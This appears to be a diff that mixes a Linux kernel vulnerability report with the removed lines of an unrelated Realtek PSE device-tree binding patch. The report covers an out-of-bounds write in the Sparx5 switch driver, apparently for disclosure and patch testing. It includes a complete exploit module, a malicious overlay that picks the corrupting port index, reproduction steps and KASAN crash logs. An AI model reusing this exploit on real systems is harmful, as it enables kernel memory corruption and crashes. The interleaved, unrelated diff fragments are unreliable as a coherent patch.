+                                                        kernel paging reque=
+st,
+                                                        oops at the store
+
+2. PoC design (poc_sparx5_oob.c)
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D
+
+The module only delivers input the driver already trusts:
+
+  1. Malicious DT overlay (evil_overlay.dts, embedded as a blob): adds a
+     poc-sparx5 switch node with three MMIO windows and one
+     ethernet-port whose reg is a placeholder, patched at module load to
+     the chosen value. of_overlay_fdt_apply() -> of_platform_notify()
+     auto-creates the platform devices, so the *clean* driver's probe
+     runs inside the apply call -- the full chain is visible in the
+     KASAN stack trace.
+
+  2. Stub serdes PHY provider -- probe requires devm_of_phy_get().
+
+  3. Fake register file -- mem=3D700M on a -m 1G QEMU guest carves the RAM
+     tail [0x6bc00000, 0x80000000) out of the memory map (pfn_valid()
+     is false there, so the driver's devm_ioremap() succeeds). Only two
+     value-deciding register reads happen before the port-creation loop,
+     both prefilled: GCB_CHIP_ID.PART_ID =3D 0x7546 and
+     HSCH_RESET_CFG.CORE_ENA =3D 1; every other access is a write or a
+     read-modify-write that does not branch on the value.
+
+Threat model: the parsed device tree is attacker-controlled data in
+several realistic scenarios -- runtime DT overlays (CONFIG_OF_OVERLAY),
+a corrupted or maliciously replaced DTB (kexec --dtb is the trivially
+reachable variant), or bootloader DT fixups on SparX-5 boards.
+
+3. Results
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Unpatched:
+
+  mode 0 (reg =3D 15839) -> BUG: KASAN: use-after-free in
+      mchp_sparx5_probe+0x3464 [sparx5_switch], Write of size 8, at the
+      first byte past the order-5 allocation (shadow 00...00 | ff ff ff
+      boundary). Deterministic.
+
+  mode 1 (reg =3D 0x20000000) -> Unable to handle kernel paging request,
+      oops, pc =3D mchp_sparx5_probe (KASAN inline check faults reading
+      unmapped shadow; without KASAN the store itself faults).
+
+  mode 2 (reg =3D 65) -> silent overwrite of ports[65] (coreclock etc.),
+      probe continues, secondary effect: NULL-pointer write (0x4) oops
+      in sparx5_port_init+0x1028.
+
+Patched (the exact diff from the patch email, rebuilt into the driver):
+
+  mode 0: sparx5-switch 6bc00000.poc-sparx5: port 15839: reg out of range
+  mode 1: sparx5-switch 6bc00000.poc-sparx5: port 536870912: reg out of ran=
+ge
+  mode 2: sparx5-switch 6bc00000.poc-sparx5: port 65: reg out of range
+  -> KASAN reports / oopses: 0 in all three modes; the bad node is
+     skipped during DT parsing and probe completes normally for the
+     valid ports.
+
+Evidence excerpts for all of the above are inlined at the end of this
+mail; full untrimmed console logs available on request.
+
+4. Reproduction
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Host: aarch64 gcc 14.3 cross toolchain, qemu-system-aarch64 (virt,
+cortex-a57, -smp 2 -m 1G), busybox initramfs. Kernel fragment:
+KASAN_GENERIC + KASAN_INLINE + OF_OVERLAY + SPARX5_SWITCH=3Dm (plus
+bridge/phylink module deps).
+
+    ./poc/mkinitramfs.sh        # packs init + clean .ko files
+    ./poc/run-qemu.sh 0 1       # mode 0/1/2, auto-poweroff
+    # boot cmdline: mem=3D700M kasan_multi_shot=3D1 panic=3D-1
+
+Inside the guest /init loads the dependency modules, then
+insmod poc_sparx5_oob.ko mode=3D$poc_mode, echoes dmesg, powers off.
+
+5. PoC source (poc_sparx5_oob.c)
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D
+
+----8<---- poc_sparx5_oob.c ----
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * poc_sparx5_oob.c - PoC: OOB write via unchecked DT 'reg' port number in
+ * the Microchip Sparx5 switch driver of an *unmodified* upstream kernel.
+ *
+ * Note: this PoC was developed with the assistance of an AI tool (Claude).
+ *
+ * Vulnerable code (drivers/net/ethernet/microchip/sparx5/sparx5_main.c,
+ * kernel 7.4-rc2 -- no bounds check anywhere on the path):
+ *
+ *   mchp_sparx5_probe():
+ *           err =3D of_property_read_u32(portnp, "reg", &portno);
+ *           ...
+ *           config->portno =3D portno;
+ *   sparx5_create_port():
+ *           sparx5->ports[config->portno] =3D spx5_port;   <-- OOB write
+ *
+ *   struct sparx5::ports[] has SPX5_PORTS (65) entries; the struct is
+ *   allocated with devm_kzalloc_obj() (plain kmalloc, ~83KB here).
+ *
+ * Attack surface being modelled: the device tree the driver parses is
+ * attacker-controlled data (runtime DT overlay, malicious DTB, kexec-suppl=
+ied
+ * DTB, bootloader DT fixups on SparX-5 boards).  This module delivers
+ * exactly that input and nothing more:
+ *
+ *   1. applies a runtime device tree overlay (evil_overlay.dtbo compiled
+ *      from evil_overlay.dts) that instantiates a sparx5-switch node with
+ *      one ethernet port whose 'reg' is out of range   [the malicious inpu=
+t]
+ *   2. provides a stub serdes PHY provider   (probe needs devm_of_phy_get)
+ *   3. prefills a RAM window carved out via 'mem=3D700M' that stands in fo=
+r
+ *      the switch register file:
+ *        - GCB_CHIP_ID.PART_ID =3D 0x7546   (steers init_features/corecloc=
+k)
+ *        - HSCH_RESET_CFG.CORE_ENA =3D 1    (skips the RAM-init poll loop)
+ *      Every other register access before the port-creation loop is a pure
+ *      write or a read-modify-write that does not branch on the value.
+ *
+ * Then it creates the platform device; the *clean* in-tree driver performs
+ * the out-of-bounds write all by itself.
+ *
+ * Modes (module param 'mode', or explicit port number via 'regno'):
+ *   0 (default) - land the write just past the end of the order-5 (128K)
+ *                 allocation backing struct sparx5 -> KASAN report on the
+ *                 poisoned free buddy page
+ *   1           - wild write far past the linear map -> kernel oops
+ *   2           - reg=3D65: first OOB slot, silent in-struct corruption
+ *                 (hits coreclock / num_stats / stats_layout / stats)
+ *
+ * Note: devm_kzalloc()'s alloc_dr() rounds the request up to the full kmal=
+loc
+ * bucket, so KASAN has NO redzone between sizeof(struct sparx5) and the 12=
+8K
+ * block end -- writes in that window are invisible to KASAN (verified live=
+).
+ */
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/init.h>
+#include <linux/io.h>
+#include <linux/mm.h>
+#include <linux/slab.h>
+#include <linux/platform_device.h>
+#include <linux/phy/phy.h>
+#include <linux/of.h>
+#include <linux/of_platform.h>
+
+/* struct sparx5 layout (sizeof/offsetof) straight from the driver headers =
+*/
+#include "sparx5_main.h"
+
+/* compiled from evil_overlay.dts; placeholder reg 0xdeadbee1 */
+#include "evil_overlay_blob.h"
+
+/* ---- fake register file: RAM tail carved out with mem=3D700M on -m 1G --=
+-- *
+ * guest RAM [0x40000000, 0x80000000), usable capped at 0x6bc00000, so the
+ * window [0x6bc00000, 0x80000000) backs the whole ~296MB physical span of
+ * the switch's register map (targets up to offset 0x11b00000).
+ */
+#define REG_BASE        0x6BC00000UL
+#define REG_WINDOW      0x11B10000UL
+
+/*
+ * Register offsets inside the fake window (relative to REG_BASE), derived
+ * from the driver's own tables for this exact tree:
+ *   regs[TARGET_GCB]  =3D res2.start            (GCB is the first range-2
+ *                                             iomap entry, offset 0x110100=
+00)
+ *   regs[TARGET_HSCH] =3D res2.start - 0x11010000 + 0x11580000
+ *   GCB_CHIP_ID       =3D regs[TARGET_GCB] + 0
+ *   HSCH_RESET_CFG    =3D regs[TARGET_HSCH] + gaddr[GA_HSCH_MMGT](=3D16236=
+8)
+ *                                                                + raddr(=
+=3D8)
+ */
+#define GCB_CHIP_ID_OFF         0x11010000u
+#define HSCH_RESET_CFG_OFF      0x115A7A48u
+
+/* GCB_CHIP_ID.PART_ID is bits 27:12; SPX5_TARGET_CT_7546 =3D 0x7546 */
+#define CHIP_ID_VALUE           (0x7546u << 12)
+/* HSCH_RESET_CFG.CORE_ENA =3D BIT(0) */
+#define RESET_CFG_VALUE         1u
+
+#define PLACEHOLDER_REG         0xdeadbee1u
+
+static unsigned int mode =3D 0;
+module_param(mode, uint, 0444);
+MODULE_PARM_DESC(mode, "0=3DKASAN redzone (default), 1=3Dwild write oops,
+2=3Dreg 65 silent");
+
+static unsigned int regno;
+module_param(regno, uint, 0444);
+MODULE_PARM_DESC(regno, "explicit port number override (takes precedence)")=
+;
+
+static struct device_node *root_np, *phy_np, *sw_np;
+static struct platform_device *phy_pdev, *sw_pdev;
+static void __iomem *regs_win;
+static void *blob;
+static int ovcs_id =3D -1;
+
+/* ------------------------------------------------------------------ */
+/* stub serdes PHY provider                                            */
+/* ------------------------------------------------------------------ */
+
+/* read a KASAN shadow byte directly (KASAN_SHADOW_OFFSET from .config) */
+#define POC_KASAN_OFFSET        0xdfff800000000000UL
+static void poc_dump_shadow(const char *tag, void *addr)
+{
+        u8 s =3D *(volatile u8 *)(((unsigned long)addr >> 3) + POC_KASAN_OF=
+FSET);
+
+        pr_info("poc: shadow[%s addr=3D%px] =3D 0x%02x\n", tag, addr, s);
+}
+
+static int poc_phy_stub(struct phy *phy)
+{
+        return 0;
+}
+
+static int poc_phy_set_mode(struct phy *phy, enum phy_mode mode, int submod=
+e)
+{
+        return 0;
+}
+
+static const struct phy_ops poc_phy_ops =3D {
+        .init           =3D poc_phy_stub,
+        .exit           =3D poc_phy_stub,
+        .power_on       =3D poc_phy_stub,
+        .power_off      =3D poc_phy_stub,
+        .set_mode       =3D poc_phy_set_mode,
+        .owner          =3D THIS_MODULE,
+};
+
+static struct phy *poc_phy_xlate(struct device *dev,
+                                 const struct of_phandle_args *args)
+{
+        return dev_get_drvdata(dev);
+}
+
+static int poc_phy_probe(struct platform_device *pdev)
+{
+        struct phy_provider *provider;
+        struct phy *phy;
+
+        phy =3D devm_phy_create(&pdev->dev, pdev->dev.of_node, &poc_phy_ops=
+);
+        if (IS_ERR(phy))
+                return PTR_ERR(phy);
+
+        platform_set_drvdata(pdev, phy);
+
+        provider =3D devm_of_phy_provider_register(&pdev->dev, poc_phy_xlat=
+e);
+        if (IS_ERR(provider))
+                return PTR_ERR(provider);
+
+        dev_info(&pdev->dev, "stub serdes PHY provider registered\n");
+        return 0;
+}
+
+static const struct of_device_id poc_phy_of_match[] =3D {
+        { .compatible =3D "poc,stub-phy" },
+        { }
+};
+
+static struct platform_driver poc_phy_driver =3D {
+        .probe =3D poc_phy_probe,
+        .driver =3D {
+                .name =3D "poc-stub-phy",
+                .of_match_table =3D poc_phy_of_match,
+        },
+};
+
+/* ------------------------------------------------------------------ */
+/* evil port number selection                                          */
+/* ------------------------------------------------------------------ */
+
+static u32 poc_pick_evil_portno(void)
+{
+        size_t size =3D sizeof(struct sparx5);
+        size_t off  =3D offsetof(struct sparx5, ports);
+        size_t objsz;
+
+        /* devm_kzalloc_obj -> kmalloc(sizeof) - no dedicated cache */
+        objsz =3D kmalloc_size_roundup(size);
+
+        pr_info("poc: sizeof(struct sparx5)=3D%zu (0x%zx) offsetof(ports)=
+=3D0x%zx "
+                "kmalloc backing=3D%zu (0x%zx)\n",
+                size, size, off, objsz, objsz);
+
+        if (regno)
+                return regno;
+
+        switch (mode) {
+        case 2:
+                return 65;      /* ports[65] =3D=3D coreclock/num_stats */
+        case 1:
+                /* +4GiB: outside the linear map -> translation fault at th=
+e
+                 * store instruction inside sparx5_create_port() */
+                return (u32)((4UL << 30) >> 3);
+        default:
+                /*
+                 * NOTE: devm_kzalloc() routes through alloc_dr(), which
+                 * allocates kmalloc_size_roundup(sizeof(struct devres)=3D0=
+x80
+                 * + size) =3D the FULL 128K bucket.  Generic KASAN therefo=
+re
+                 * has no requested-size redzone for this object at all
+                 * (verified live: shadow at obj+size+0x100 is 0x00) -- whi=
+ch
+                 * is exactly why this bug survives KASAN testing.
+                 *
+                 * So aim at the first byte PAST the order-5 block instead:
+                 *   write =3D alloc_base + 0x80 (devres hdr) + 0x1088
+                 *           + portno*8  =3D=3D  alloc_base + 0x20000
+                 * The neighbouring page is free buddy memory whose shadow =
+is
+                 * KASAN-poisoned (0xff) -> deterministic report.
+                 */
+                return (u32)((0x20000UL - 0x1108UL) >> 3);      /* 15839 */
+        }
+}
+
+/* ------------------------------------------------------------------ */
+/* malicious overlay                                                   */
+/* ------------------------------------------------------------------ */
+
+static int poc_apply_overlay(u32 evil)
+{
+        __be32 marker =3D cpu_to_be32(PLACEHOLDER_REG);
+        u32 repl =3D cpu_to_be32(evil);
+        int count =3D 0;
+        u8 *p, *end;
+        int ret;
+
+        blob =3D kmemdup(evil_overlay_dtbo, evil_overlay_dtbo_len, GFP_KERN=
+EL);
+        if (!blob)
+                return -ENOMEM;
+
+        /* patch the placeholder port reg in the writable blob */
+        end =3D blob + evil_overlay_dtbo_len - 4;
+        for (p =3D blob; p <=3D end; p++) {
+                if (!memcmp(p, &marker, 4)) {
+                        memcpy(p, &repl, 4);
+                        count++;
+                }
+        }
+        if (count !=3D 1) {
+                pr_err("poc: placeholder patch count %d (!=3D 1), aborting\=
+n",
+                       count);
+                ret =3D -EINVAL;
+                goto err_free;
+        }
+
+        ret =3D of_overlay_fdt_apply(blob, evil_overlay_dtbo_len, &ovcs_id,
+                                   root_np);
+        if (ret) {
+                pr_err("poc: overlay apply failed: %d\n", ret);
+                goto err_free;
+        }
+
+        phy_np =3D of_find_node_by_name(root_np, "poc-stub-phy");
+        sw_np  =3D of_find_node_by_name(root_np, "poc-sparx5");
+        if (!phy_np || !sw_np) {
+                pr_err("poc: overlay nodes not found (phy=3D%p sw=3D%p)\n",
+                       phy_np, sw_np);
+                ret =3D -ENOENT;
+                goto err_remove;
+        }
+
+        pr_info("poc: malicious overlay applied, evil port reg =3D <%u> (0x=
+%x)\n",
+                evil, evil);
+        return 0;
+
+err_remove:
+        of_overlay_remove(&ovcs_id);
+        ovcs_id =3D -1;
+err_free:
+        kfree(blob);
+        blob =3D NULL;
+        return ret;
+}
+
+static void poc_remove_overlay(void)
+{
+        if (sw_pdev)
+                of_platform_device_destroy(&sw_pdev->dev, NULL);
+        if (phy_pdev)
+                of_platform_device_destroy(&phy_pdev->dev, NULL);
+        if (ovcs_id >=3D 0) {
+                of_overlay_remove(&ovcs_id);
+                ovcs_id =3D -1;
+        }
+        kfree(blob);
+        blob =3D NULL;
+}
+
+/* ------------------------------------------------------------------ */
+
+static int __init poc_init(void)
+{
+        u32 evil;
+        int ret;
+
+        pr_info("poc: sparx5 DT 'reg' OOB write PoC (mode=3D%u regno=3D%u)\=
+n",
+                mode, regno);
+
+        root_np =3D of_find_node_by_path("/");
+        if (!root_np) {
+                pr_err("poc: no root node?!\n");
+                return -ENOENT;
+        }
+
+        /* KASAN detector self-test (validates the harness, not the bug):
+         * same allocation geometry as the driver's struct sparx5. */
+        {
+                size_t sz =3D sizeof(struct sparx5);
+                struct platform_device *dummy;
+                u8 *t;
+
+                t =3D kmalloc(sz, GFP_KERNEL);
+                pr_info("poc: kasan self-test1: kmalloc(%zu)=3D%px,
+store at +%zu\n",
+                        sz, t, sz + 0x100);
+                if (t) {
+                        poc_dump_shadow("selftest1 redzone", t + sz + 0x100=
+);
+                        *(volatile u32 *)(t + sz + 0x100) =3D 0x41414141;
+                        pr_info("poc: kasan self-test1 store done\n");
+                        kfree(t);
+                }
+
+                /* replicate the driver's exact allocation path:
+                 * devm_kzalloc_obj() -> devm_kzalloc(dev, sizeof,
+GFP_KERNEL) */
+                dummy =3D platform_device_register_simple("poc-dummy",
+PLATFORM_DEVID_NONE, NULL, 0);
+                if (!IS_ERR(dummy)) {
+                        t =3D devm_kzalloc(&dummy->dev, sz, GFP_KERNEL);
+                        pr_info("poc: kasan self-test2:
+devm_kzalloc(%zu)=3D%px\n", sz, t);
+                        if (t) {
+                                poc_dump_shadow("selftest2 redzone", t
++ sz + 0x100);
+                                poc_dump_shadow("selftest2 in-obj ", t
++ 0x1000);
+                                *(volatile u32 *)(t + sz + 0x100) =3D 0x424=
+24242;
+                                pr_info("poc: kasan self-test2 store done\n=
+");
+                        }
+                        platform_device_unregister(dummy);
+                }
+        }
+
+        evil =3D poc_pick_evil_portno();
+
+        /* 1. diagnostics: probe the register windows exactly like the
+         *    driver's devm_ioremap() will */
+        {
+                const resource_size_t dbase[3] =3D {
+                        REG_BASE, REG_BASE + 0x10004000, REG_BASE + 0x11010=
+000
+                };
+                const resource_size_t dsize[3] =3D {
+                        0x401000, 0x7fc000, 0xaf0000
+                };
+                void __iomem *t;
+                int i;
+
+                for (i =3D 0; i < 3; i++) {
+                        t =3D ioremap(dbase[i], dsize[i]);
+                        pr_info("poc: diag ioremap(pa %#llx +%#llx) =3D %px=
+\n",
+                                (u64)dbase[i], (u64)dsize[i], t);
+                        if (t)
+                                iounmap(t);
+                }
+        }
+
+        /* 2. prefill the fake register file (must happen before probe,
+         *    which now runs during overlay application) */
+        regs_win =3D ioremap(REG_BASE, REG_WINDOW);
+        if (!regs_win) {
+                pr_err("poc: ioremap of register window failed\n");
+                ret =3D -ENOMEM;
+                goto err_root;
+        }
+        writel(CHIP_ID_VALUE, regs_win + GCB_CHIP_ID_OFF);
+        writel(RESET_CFG_VALUE, regs_win + HSCH_RESET_CFG_OFF);
+        pr_info("poc: prefilled GCB_CHIP_ID=3D%#x @pa %#lx,
+HSCH_RESET_CFG=3D%#x @pa %#lx\n",
+                CHIP_ID_VALUE, (unsigned long)REG_BASE + GCB_CHIP_ID_OFF,
+                RESET_CFG_VALUE, (unsigned long)REG_BASE + HSCH_RESET_CFG_O=
+FF);
+
+        /* 3. stub phy provider driver must be registered before the overla=
 y
-of the host driver, which uses the supply reference for budget accounting.
+         *    applies (the notifier creates its platform device and probes
+         *    it during of_overlay_fdt_apply()) */
+        ret =3D platform_driver_register(&poc_phy_driver);
+        if (ret) {
+                pr_err("poc: phy driver register failed\n");
+                goto err_root;
+        }
 
-Signed-off-by: Jonas Jelonek <jonas@jonasjelonek.de>
-Reviewed-by: Kory Maincent <kory.maincent@bootlin.com>
-Acked-by: Rob Herring (Arm) <robh@kernel.org>
-=2D--
- .../bindings/net/pse-pd/realtek,pse-mcu-gen1.yaml        | 9 +++++++++
- 1 file changed, 9 insertions(+)
+        /* 4. apply the malicious overlay.  of_platform_notify() creates th=
+e
+         *    platform devices for the new nodes right away, so the clean
+         *    mchp_sparx5_probe() runs INSIDE this call and performs the OO=
+B
+         *    write at  sparx5->ports[config->portno] =3D spx5_port;       =
+  */
+        pr_info("poc: applying malicious overlay - probe incoming\n");
+        ret =3D poc_apply_overlay(evil);
+        if (ret)
+                goto err_drv;
 
-diff --git a/Documentation/devicetree/bindings/net/pse-pd/realtek,pse-mcu-=
-gen1.yaml b/Documentation/devicetree/bindings/net/pse-pd/realtek,pse-mcu-g=
-en1.yaml
-index 526f8525bb4d..6acb5fb641c1 100644
-=2D-- a/Documentation/devicetree/bindings/net/pse-pd/realtek,pse-mcu-gen1.=
-yaml
-+++ b/Documentation/devicetree/bindings/net/pse-pd/realtek,pse-mcu-gen1.ya=
-ml
-@@ -92,6 +92,15 @@ properties:
-       asserted.
-     maxItems: 1
-=20
-+  vmain-supply:
-+    description:
-+      Regulator representing the PoE power allocation of the 44-57V VMAIN
-+      supply. This MCU must be its only power-budget consumer. Its unclai=
-med
-+      power budget is used to configure the MCU global PoE power budget. =
-The
-+      regulator must define a finite regulator-power-budget-milliwatt val=
-ue.
-+      The supply is available independently of the host driver and is use=
-d
-+      for power-budget accounting only.
-+
- required:
-   - compatible
-=20
-=2D-=20
-2.53.0
+        pr_info("poc: probe returned - check dmesg for KASAN report\n");
 
+        /* post-mortem: dump the switch device's parsed resources and repla=
+y
+         * the driver's exact devm_ioremap() on each one, to pinpoint which
+         * window (and which parsed value) fails */
+        {
+                struct platform_device *pdev =3D of_find_device_by_node(sw_=
+np);
+
+                if (pdev) {
+                        struct resource *r;
+                        void __iomem *t;
+                        int i;
+
+                        for (i =3D 0; i < 8; i++) {
+                                r =3D platform_get_resource(pdev,
+IORESOURCE_MEM, i);
+                                if (!r)
+                                        break;
+                                pr_info("poc: res[%d] =3D %pa..%pa size
+%#llx name %s\n",
+                                        i, &r->start, &r->end,
+                                        (unsigned long long)resource_size(r=
+),
+                                        r->name);
+                                t =3D devm_ioremap(&pdev->dev, r->start,
+                                                 resource_size(r));
+                                pr_info("poc: res[%d] devm_ioremap =3D
+%px\n", i, t);
+                                if (t)
+                                        devm_iounmap(&pdev->dev, t);
+                        }
+                        platform_device_put(pdev);
+                } else {
+                        pr_err("poc: no platform device for sw_np\n");
+                }
+        }
+
+        return 0;
+
+err_drv:
+        platform_driver_unregister(&poc_phy_driver);
+err_root:
+        of_node_put(root_np);
+        return ret;
+}
+
+static void __exit poc_exit(void)
+{
+        if (regs_win)
+                iounmap(regs_win);
+        poc_remove_overlay();
+        platform_driver_unregister(&poc_phy_driver);
+        of_node_put(root_np);
+        pr_info("poc: unloaded\n");
+}
+
+module_init(poc_init);
+module_exit(poc_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("PoC: sparx5 DT reg portno OOB write (clean-kernel bug)"=
+);
+----8<---- end poc_sparx5_oob.c ----
+
+7. Malicious overlay source (evil_overlay.dts)
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+----8<---- evil_overlay.dts ----
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * evil_overlay.dts - malicious device tree overlay for the Microchip Sparx=
+5
+ * switch driver OOB write PoC.
+ *
+ * The ethernet port 'reg' value is the attack payload: it is used
+ * *unchecked* as an index into struct sparx5::ports[SPX5_PORTS=3D65].
+ * The compiled blob is embedded into the PoC module; the placeholder
+ * value 0xdeadbee1 is replaced at runtime with the chosen port number
+ * (module param 'mode' or 'regno').
+ *
+ * The three MMIO windows mirror the register layout the driver expects
+ * (sparx5.dtsi) but are backed by a RAM tail carved out of the guest
+ * memory map with 'mem=3D700M' on a '-m 1G' virt machine (0x6bc00000..).
+ */
+/dts-v1/;
+/plugin/;
+
+/ {
+        fragment@0 {
+                target-path =3D "/";
+                __overlay__ {
+                        /* NOTE: no #address-cells/#size-cells here - the r=
+oot
+                         * already has 2/2 and overlays may not change it, =
+so
+                         * the switch node's reg below uses 2 address cells=
+ +
+                         * 2 size cells per tuple. */
+
+                        pocphy: poc-stub-phy {
+                                compatible =3D "poc,stub-phy";
+                                #phy-cells =3D <0>;
+                                status =3D "okay";
+                        };
+
+                        poc-sparx5 {
+                                compatible =3D "microchip,sparx5-switch";
+                                status =3D "okay";
+                                #address-cells =3D <1>;
+                                #size-cells =3D <1>;
+                                /* cpu, dev, gcb windows (see
+sparx5.dtsi reg-names).
+                                 * QEMU virt root uses #address-cells=3D<2>=
+ and
+                                 * #size-cells=3D<2>, so each tuple is 2 ad=
+dr + 2
+                                 * size cells: <hi lo hi lo>. */
+                                reg =3D <0x0 0x6bc00000 0x0 0x00401000>,
+                                      <0x0 0x7bc04000 0x0 0x007fc000>,
+                                      <0x0 0x7cc10000 0x0 0x00af0000>;
+
+                                ethernet-ports {
+                                        #address-cells =3D <1>;
+                                        #size-cells =3D <0>;
+
+                                        port@0 {
+                                                reg =3D <0xdeadbee1>;
+ /* evil: >=3D 65 */
+                                                phy-mode =3D "sgmii";
+                                                microchip,bandwidth =3D <10=
+00>;
+                                                phys =3D <&pocphy>;
+                                                status =3D "okay";
+                                        };
+                                };
+                        };
+                };
+        };
+};
+----8<---- end evil_overlay.dts ----
+
+8. Evidence logs (trimmed)
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D
+
+--- mode 0, unpatched: KASAN use-after-free at the 128 KiB boundary ---
+
+[    6.953141] poc: applying malicious overlay - probe incoming
+[    6.977682] poc-stub-phy poc-stub-phy: stub serdes PHY provider register=
+ed
+[    7.000621] sparx5-switch 6bc00000.poc-sparx5: MAC addr was not
+set, use random MAC
+[    7.001132] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+fdma not found
+[    7.001498] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+xtr not found
+[    7.001566] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+ptp not found
+[    7.006202] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+[    7.006276] BUG: KASAN: use-after-free in
+mchp_sparx5_probe+0x3464/0x4640 [sparx5_switch]
+[    7.006569] Write of size 8 at addr ffff000010980000 by task insmod/71
+[    7.006616]
+[    7.006689] CPU: 1 UID: 0 PID: 71 Comm: insmod Tainted: G    B
+O        7.4.0-rc2+ #1 PREEMPT(full)
+[    7.006767] Tainted: [B]=3DBAD_PAGE, [O]=3DOOT_MODULE
+[    7.006791] Hardware name: linux,dummy-virt (DT)
+[    7.006831] Call trace:
+[    7.006861]  show_stack+0x18/0x30 (C)
+[    7.006946]  dump_stack_lvl+0x60/0x80
+[    7.007006]  print_report+0x17c/0x4d8
+[    7.007062]  kasan_report+0xbc/0x130
+[    7.007122]  __asan_report_store8_noabort+0x20/0x30
+[    7.007183]  mchp_sparx5_probe+0x3464/0x4640 [sparx5_switch]
+[    7.007317]  platform_probe+0xc4/0x190
+[    7.007376]  really_probe+0x17c/0x5d0
+[    7.007432]  __driver_probe_device+0x234/0x340
+[    7.007491]  driver_probe_device+0xe4/0x150
+[    7.007548]  __device_attach_driver+0x168/0x210
+[    7.007611]  bus_for_each_drv+0x108/0x1a0
+[    7.007668]  __device_attach+0x16c/0x330
+[    7.007740]  device_initial_probe+0x8c/0xc0
+[    7.007801]  __bus_probe_device+0x54/0x120
+[    7.007866]  bus_probe_device+0x10/0x20
+[    7.007928]  device_add+0xc38/0x1220
+[    7.008024]  of_device_add+0xdc/0x150
+[    7.008090]  of_platform_device_create_pdata+0x118/0x200
+[    7.008147]  of_platform_notify+0x218/0x300
+[    7.008218]  blocking_notifier_call_chain+0xc4/0x130
+[    7.008280]  __of_changeset_entry_notify+0x11c/0x3f0
+[    7.008343]  __of_changeset_apply_notify+0x64/0xc0
+[    7.008396]  of_overlay_fdt_apply+0xf50/0x16f0
+[    7.008454]  poc_init+0x584/0x1000 [poc_sparx5_oob]
+[    7.008534]  do_one_initcall+0xd0/0x310
+[    7.008590]  do_init_module+0x234/0x6e0
+[    7.008652]  load_module+0x3a44/0x4dc0
+[    7.008717]  __do_sys_init_module+0x1f0/0x2e0
+[    7.008777]  __arm64_sys_init_module+0x70/0xa0
+[    7.008844]  invoke_syscall+0x74/0x2c0
+[    7.008899]  el0_svc_common.constprop.0+0xac/0x230
+[    7.008953]  do_el0_svc+0x40/0x60
+[    7.009015]  el0_svc+0x38/0xa0
+[    7.009078]  el0t_64_sync_handler+0xa0/0xf0
+[    7.009139]  el0t_64_sync+0x198/0x19c
+[    7.009203]
+[    7.009226] The buggy address belongs to the physical page:
+[    7.009361] page: refcount:0 mapcount:0 mapping:0000000000000000
+index:0x0 pfn:0x50980
+[    7.009424] flags: 0x3fffe0000000000(node=3D0|zone=3D0|lastcpupid=3D0x1f=
+fff)
+[    7.009548] page_type: f0(buddy)
+[    7.009611] raw: 03fffe0000000000 ffff00002ba92958 ffff00002ba92958
+0000000000000000
+[    7.009661] raw: 0000000000000000 0000000000000007 00000000f0000000
+0000000000000000
+[    7.009706] page dumped because: kasan: bad access detected
+[    7.009735]
+[    7.009753] Memory state around the buggy address:
+[    7.009793]  ffff00001097ff00: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+[    7.009841]  ffff00001097ff80: 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00
+[    7.009875] >ffff000010980000: ff ff ff ff ff ff ff ff ff ff ff ff
+ff ff ff ff
+[    7.009903]                    ^
+[    7.009943]  ffff000010980080: ff ff ff ff ff ff ff ff ff ff ff ff
+ff ff ff ff
+[    7.009994]  ffff000010980100: ff ff ff ff ff ff ff ff ff ff ff ff
+ff ff ff ff
+[    7.010027] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+--- mode 1, unpatched: +4 GiB wild write oops ---
+
+[    6.006952] sparx5-switch 6bc00000.poc-sparx5: MAC addr was not
+set, use random MAC
+[    6.007431] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+fdma not found
+[    6.007779] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+xtr not found
+[    6.007844] sparx5-switch 6bc000
+** replaying previous printk message **
+[    6.007844] sparx5-switch 6bc00000.poc-sparx5: error -ENXIO: IRQ
+ptp not found
+[    6.012493] Unable to handle kernel paging request at virtual
+address ffff600022134221
+[    6.012612] KASAN: probably wild-memory-access in range
+[0xffff0001109a1108-0xffff0001109a110f]
+[    6.012652] Mem abort info:
+[    6.012679]   ESR =3D 0x0000000096000006
+[    6.012748]   EC =3D 0x25: DABT (current EL), IL =3D 32 bits
+[    6.012778]   SET =3D 0, FnV =3D 0
+[    6.012799]   EA =3D 0, S1PTW =3D 0
